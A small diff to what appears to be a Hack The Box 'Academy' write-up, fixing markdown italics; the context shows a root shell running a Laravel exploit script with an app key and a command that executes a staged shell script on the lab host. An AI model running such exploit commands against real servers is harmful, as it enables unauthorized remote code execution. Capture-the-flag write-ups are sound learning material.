@@ -290,7 +290,7 @@ pasha.sh
 pasha.sh
 ```
 
-*Run it
+*Run it*
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;/bin/bash pasha.sh;ls'
